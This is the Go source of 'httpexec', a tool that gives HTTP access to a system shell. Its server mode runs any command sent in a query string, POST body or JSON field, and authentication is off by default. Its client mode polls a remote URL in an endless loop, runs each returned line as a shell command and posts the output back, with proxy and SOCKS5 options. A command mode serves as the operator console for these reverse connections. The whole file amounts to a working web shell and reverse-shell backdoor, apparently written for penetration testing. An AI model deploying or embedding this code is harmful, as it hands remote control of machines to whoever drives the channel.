//usr/bin/go run $0 $@ ; exit
// httpexec in Go. Copyright (C) Kost. Distributed under MIT.
// RESTful interface to your operating system shell

package main

import (
	"bytes"
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"flag"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/cgi"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"time"
	"golang.org/x/net/proxy"
)

// CmdReq holds JSON input request.
type CmdReq struct {
	Cmd    string
	Nojson bool
	Stdin  string
}

// CmdResp holds JSON output request.
type CmdResp struct {
	Cmd    string
	Stdout string
	Stderr string
	Err    string
}

var auth string  // basic authentication combo
var realm string // basic authentication realm

var VerboseLevel int // VerboseLevel holds global verbosity level.
var SilentOutput bool // SilentOutput is silent output.
var MethodToUse string // Method to use in query
var DelayDuration string // Delay between queries
var Socks5 string // SOCKS5 proxy
var ProxyStr string // HTTP proxy
var TLScert string
var TLSkey string
var OptCmd bool // Command mode in server
var OptTLS bool // TLS connection?
var OptVerify string // CA/Cert to verify
var SrvURI string // URI to listen
var SrvListen string // Listen address

var CmdBuff []string

// check basic authentication if set
func checkAuth(w http.ResponseWriter, r *http.Request) bool {
	s := strings.SplitN(r.Header.Get("Authorization"), " ", 2)
	if len(s) != 2 {
		return false
	}

	b, err := base64.StdEncoding.DecodeString(s[1])
	if err != nil {
		return false
	}

	return bytes.Equal(b, []byte(auth))
}

// real content Handler
func contHandler(w http.ResponseWriter, r *http.Request) {
	var jsonout bool
	var inputjson CmdReq
	var outputjson CmdResp
	var body []byte
	if r.Header.Get("Content-Type") == "application/json" {
		w.Header().Set("Content-Type", "application/json")
		jsonout = true
	} else {
		w.Header().Set("Content-Type", "text/plain")
	}
	cmdstr := ""
	urlq, urlErr := url.QueryUnescape(r.URL.RawQuery)
	if urlErr != nil {
		log.Printf("url query unescape: %v", urlErr)
	}
	if r.Method == "GET" || r.Method == "HEAD" {
		cmdstr = urlq
	}
	if r.Method == "POST" {
		var rerr error
		body, rerr = ioutil.ReadAll(r.Body)
		if rerr != nil {
			log.Printf("read Body: %v", rerr)
		}
		if closeErr := r.Body.Close(); closeErr != nil {
			log.Printf("body close: %v", closeErr)

		}
		if VerboseLevel > 2 {
			log.Printf("Body: %s", body)
		}

		if len(urlq) > 0 {
			cmdstr = urlq
		} else {
			if jsonout {
				jerr := json.Unmarshal(body, &inputjson)
				if jerr != nil {
					// http.Error(w, jerr.Error(), 400)
					return
				}
				cmdstr = inputjson.Cmd
				jsonout = !inputjson.Nojson
			} else {
				cmdstr = string(body)
			}
		}
	}
	if VerboseLevel > 0 {
		log.Printf("Command to execute: %s", cmdstr)
	}

	if len(cmdstr) < 1 {
		return
	}

	parts := strings.Fields(cmdstr)
	head := parts[0]
	parts = parts[1:]

	cmd := exec.Command(head, parts...)

	// Handle stdin if have any
	if len(urlq) > 0 && r.Method == "POST" {
		if VerboseLevel > 2 {
			log.Printf("Stdin: %s", body)
		}
		cmd.Stdin = bytes.NewReader(body)
	}
	if len(inputjson.Stdin) > 0 {
		if VerboseLevel > 2 {
			log.Printf("JSON Stdin: %s", inputjson.Stdin)
		}
		cmd.Stdin = strings.NewReader(inputjson.Stdin)
	}

	var err error
	var jStdout bytes.Buffer
	var jStderr bytes.Buffer
	if r.Method == "HEAD" {
		err = cmd.Start()
	} else {
		if jsonout {
			cmd.Stdout = &jStdout
			cmd.Stderr = &jStderr
		} else {
			cmd.Stdout = w
			cmd.Stderr = w
		}
		err = cmd.Run()
	}
	if err != nil {
		if VerboseLevel > 0 {
			log.Printf("Error executing: %s", err)
		}
		if jsonout {
			outputjson.Err = err.Error()
		} else {
			if !SilentOutput {
				_, writeErr := w.Write([]byte(err.Error()))
				if writeErr != nil {
					log.Printf("write: %v", writeErr)
				}
			}
		}
	}

	if jsonout {
		outputjson.Stdout = jStdout.String()
		outputjson.Stderr = jStderr.String()
		outputjson.Cmd = cmdstr
		if encodeErr := json.NewEncoder(w).Encode(outputjson); encodeErr != nil {
			log.Printf("encode: %v", err)
		}
	}
}

func retlogstr(entry string) string {
	if len(entry) == 0 {
		return "-"
	}
	return entry
}

func dispHandler(w http.ResponseWriter, r *http.Request) {
	if OptCmd {
		cmdHandler(w, r)
	} else {
		contHandler(w, r)
	}
}

// main handler which basically checks (basic) authentication first
func handler(w http.ResponseWriter, r *http.Request) {
	if VerboseLevel > 1 {
		log.Printf("%s %s %s %s %s", retlogstr(r.RemoteAddr), retlogstr(r.Header.Get("X-Forwarded-For")), r.Method, r.RequestURI, retlogstr(r.URL.RawQuery))
	}
	if auth == "" {
		dispHandler(w, r)
	} else {
		if checkAuth(w, r) {
			dispHandler(w, r)
			return
		}
		w.Header().Set("WWW-Authenticate", `Basic realm="`+realm+`"`)
		w.WriteHeader(401)
		_, err := w.Write([]byte("401 Unauthorized\n"))
		if err != nil {
			log.Printf("401 write: %v", err)
		}
	}
}

func delayFor() {
	delay, _ := time.ParseDuration(DelayDuration)
	if VerboseLevel > 5 {
		log.Printf("Sleeping for: %d", delay)
	}
	time.Sleep(delay)
}

func clienturl(urlstr string) {
	outputs := ""

	delay, _ := time.ParseDuration(DelayDuration)

	httpTransport := &http.Transport{}
	if len(ProxyStr)>0 {
		proxyUrl, err := url.Parse(ProxyStr)
		if err != nil {
			log.Printf("proxy parse error: %v", err)
		}
		// httpTransport = &http.Transport{Proxy: http.ProxyURL(proxyUrl)}
		httpTransport.Proxy = http.ProxyURL(proxyUrl)
	}

	tlsCfg := genTlsConfig("")
	if len(TLSkey)>0 {
		// Load client cert
		cert, err := tls.LoadX509KeyPair(TLScert, TLSkey)
		if err != nil {
			log.Fatal(err)
		}
		tlsCfg.Certificates = []tls.Certificate{cert}
	}
	httpTransport.TLSClientConfig = tlsCfg


	// forever
	for {

	// http client
	httpClient := &http.Client{Transport: httpTransport}

	if len(Socks5)>0 {
		dialer, err := proxy.SOCKS5("tcp", Socks5, nil, proxy.Direct)
		if err != nil {
			log.Printf("socks dial error: %v", err)
			time.Sleep(delay)
			continue
		}
		httpTransport.Dial = dialer.Dial
	}

	u, err := url.Parse(urlstr)
	if err != nil {
		log.Printf("can't parse request: %v", err)
		time.Sleep(delay)
		continue
	}

	q := u.Query()

	var bodyreq io.Reader //bytes.Buffer
	bodyreq = nil

	// if GET query
	if MethodToUse == "GET" {
		q.Add("output",outputs)
		u.RawQuery = q.Encode()
		u.String()
	}

	if MethodToUse == "POST" {
		bodyreq = strings.NewReader(outputs)
		// bytes.NewBufferString(outputs)
	}

	if MethodToUse == "PUT" {
		bodyreq = strings.NewReader(outputs)
		// bodyreq = bytes.NewBufferString(outputs)
	}

	urlsubmit := u.String()

	req, err := http.NewRequest(MethodToUse, urlsubmit, bodyreq)
	if err != nil {
		log.Printf("can't create request: %v", err)
		time.Sleep(delay)
		continue
	}
	resp, err := httpClient.Do(req)
	if err != nil {
		log.Printf("can't execute request: %v", err)
		time.Sleep(delay)
		continue
	} else {
		// if HTTP response code is not 200, skip processing
		if resp.StatusCode != 200 {
			if VerboseLevel > 1 {
				log.Printf("Response code is not 200: %d, skipping", resp.StatusCode)
			}
			time.Sleep(delay)
			continue
		}
		defer resp.Body.Close()
		cont, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Printf("can't read request: %v", err)
			time.Sleep(delay)
			continue
		}
		outputs = ""

		content := string(cont)
		for _, line := range strings.Split(strings.TrimSuffix(content, "\n"), "\n") {

		cmdstr:=line
		if VerboseLevel > 0 {
			log.Printf("Command to execute: %s", cmdstr)
		}

		if len(cmdstr) < 1 {
			if VerboseLevel > 3 {
				log.Printf("Empty command - doing nothing, idle")
			}
			continue;
		}

		parts := strings.Fields(cmdstr)
		head := parts[0]
		parts = parts[1:]

		cmd := exec.Command(head, parts...)

		var errcmd error
		//var jStdout bytes.Buffer
		//var jStderr bytes.Buffer
		var comb bytes.Buffer
		cmd.Stdout = &comb
		cmd.Stderr = &comb
		errcmd = cmd.Run()
		if errcmd != nil {
			if VerboseLevel > 0 {
				log.Printf("Error executing: %s", errcmd)
			}
			//if jsonout {
			//	outputjson.Err = err.Error()
			//}
		}
		output := comb.String()
		if VerboseLevel > 0 {
			log.Printf("Output of execute: %s", output)
		}
		outputs = outputs + output
		} // for each line
	}
	time.Sleep(delay)
	}
}

func genTlsConfig(verify string) *tls.Config {
	var err error
	tlsCfg := &tls.Config{
		MinVersion:               tls.VersionTLS12,
		CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			// turn on for beter security if you have supported
			// tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
			// tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		},
	}
	// if verify is specified add only specific (CA) certificate to cert pool
	if len(verify) > 0 {
		caCertPool := x509.NewCertPool()
		caCert, readErr := ioutil.ReadFile(verify)
		if readErr != nil {
			log.Fatal("Error reading client verification cert: ", err)
		}
		caCertPool.AppendCertsFromPEM(caCert)

		tlsCfg.ClientCAs = caCertPool
		tlsCfg.ClientAuth = tls.RequireAndVerifyClientCert
		tlsCfg.BuildNameToCertificate()
	}
	return tlsCfg
}

func cmdHandler(w http.ResponseWriter, r *http.Request) {
	var jsonout bool
	var inputjson CmdReq
	// var outputjson CmdResp
	var body []byte
	if r.Header.Get("Content-Type") == "application/json" {
		w.Header().Set("Content-Type", "application/json")
		jsonout = true
	} else {
		w.Header().Set("Content-Type", "text/plain")
	}
	cmdstr := ""
	urlq, urlErr := url.QueryUnescape(r.URL.RawQuery)
	if urlErr != nil {
		log.Printf("url query unescape: %v", urlErr)
	}
	if r.Method == "GET" || r.Method == "HEAD" {
		cmdstr = urlq
	}
	if r.Method == "POST" {
		var rerr error
		body, rerr = ioutil.ReadAll(r.Body)
		if rerr != nil {
			log.Printf("read Body: %v", rerr)
		}
		if closeErr := r.Body.Close(); closeErr != nil {
			log.Printf("body close: %v", closeErr)

		}
		if VerboseLevel > 2 {
			log.Printf("Body: %s", body)
		}

		if len(urlq) > 0 {
			cmdstr = urlq
		} else {
			if jsonout {
				jerr := json.Unmarshal(body, &inputjson)
				if jerr != nil {
					// http.Error(w, jerr.Error(), 400)
					return
				}
				cmdstr = inputjson.Cmd
				jsonout = !inputjson.Nojson
			} else {
				cmdstr = string(body)
			}
		}
	}

	if len(cmdstr)>0 {
		log.Printf("Output of command: %s", cmdstr)
	}

	if r.Method == "HEAD" {
		log.Printf("Got HEAD pong from: %s", cmdstr)
	} else {
		for i, cmd := range CmdBuff {
			if VerboseLevel > 1 {
				log.Printf("Queuing command %d to execute: %s", i, cmd)
			}
			fmt.Fprintf(w, "%s\n", cmd)
		}
		CmdBuff = nil
	}

	if len(cmdstr) < 1 {
		return
	}

	// dummy
	if jsonout {
		return
	}
}

func dumpCmdBuff() {
	for i, cmd := range CmdBuff {
		log.Printf("Execute #%d: %s", i, cmd)
	}
}

func takeinput() {
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		str := scanner.Text()
		log.Printf("Execute: %s", str)
		CmdBuff = append(CmdBuff, str)
		// dumpCmdBuff()
	}
	if err := scanner.Err(); err != nil {
		log.Printf("Scanner error: %v", err)
	}

}

func serve() {
	http.HandleFunc(SrvURI, handler)
	var err error
	if OptTLS {
		tlsCfg := genTlsConfig(OptVerify);
		srv := &http.Server{
			Addr:      SrvListen,
			TLSConfig: tlsCfg,
		}
		// server defaults
		if len(TLScert) == 0 {
			TLScert = "server.crt"
		}
		if len(TLSkey) == 0 {
			TLSkey = "server.key"
		}
		err = srv.ListenAndServeTLS(TLScert, TLSkey)
	} else {
		err = http.ListenAndServe(SrvListen, nil)
	}
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}

// main function with main http loop and command line parsing
func main() {
	OptTLS=false
	flag.StringVar(&auth, "auth", "", "basic auth to require - in form user:pass")
	optcgi := flag.Bool("cgi", false, "CGI mode")
	flag.StringVar(&TLScert,"cert", "", "SSL/TLS certificate file")
	flag.StringVar(&TLSkey,"key", "", "SSL/TLS certificate key file")
	flag.StringVar(&SrvURI,"uri", "/", "URI to serve")
	flag.StringVar(&SrvListen,"listen", ":8080", "listen address and port")
	url := flag.String("url", "", "connect URL in client mode")
	flag.StringVar(&realm, "realm", "httpexec", "Basic authentication realm")
	flag.StringVar(&DelayDuration, "delay", "60s", "delay between requests (in hms/duration)")
	flag.StringVar(&Socks5, "socks5", "", "SOCKS5 proxy in form host:port")
	flag.StringVar(&ProxyStr, "proxy", "", "HTTP proxy in form http://host:port")
	flag.StringVar(&MethodToUse, "method", "POST", "what HTTP mode to use in client mode")
	opttls := flag.Bool("tls", false, "use TLS/SSL")
	optssl := flag.Bool("ssl", false, "use TLS/SSL")
	flag.StringVar(&OptVerify, "verify", "", "Client cert verification using SSL/TLS (CA) certificate file")
	flag.BoolVar(&OptCmd, "cmd", false, "Command mode (handler for reverse/client mode)")
	flag.BoolVar(&SilentOutput, "silentout", false, "Silent Output (do not display errors)")
	flag.IntVar(&VerboseLevel, "verbose", 0, "verbose level")

	flag.Parse()

	// turn on tls if client verification is specified
	if len(OptVerify) > 0 {
		*opttls = true
	}

	httpProto := "http"
	if *opttls || *optssl {
		httpProto = "https"
	}

	if VerboseLevel > 5 && len(auth) > 0 {
		log.Printf("Using basic authentication: %s", auth)
	}
	if VerboseLevel > 1 && len(OptVerify) > 0 {
		log.Printf("Using TLS/SSL client verification with: %s", OptVerify)
	}

	if len(*url) > 0 {
		if VerboseLevel > 0 {
			log.Printf("Starting client URL loop: %s", *url)
		}
		clienturl(*url)
		os.Exit(0)
	}

	if VerboseLevel > 0 {
		log.Printf("Starting to listen at %s with URI %s as %s", SrvListen, SrvURI, httpProto)
	}
	if *opttls || *optssl {
		OptTLS = true
	}
	if OptCmd {
		go func() {
			serve()
		}()
		takeinput()
		os.Exit(0)
	}
	if *optcgi {
		cgiErr := cgi.Serve(http.HandlerFunc(handler))
		if cgiErr != nil {
			log.Printf("cgiErr: %v", cgiErr)
		}
	} else {
		serve()
	}
}
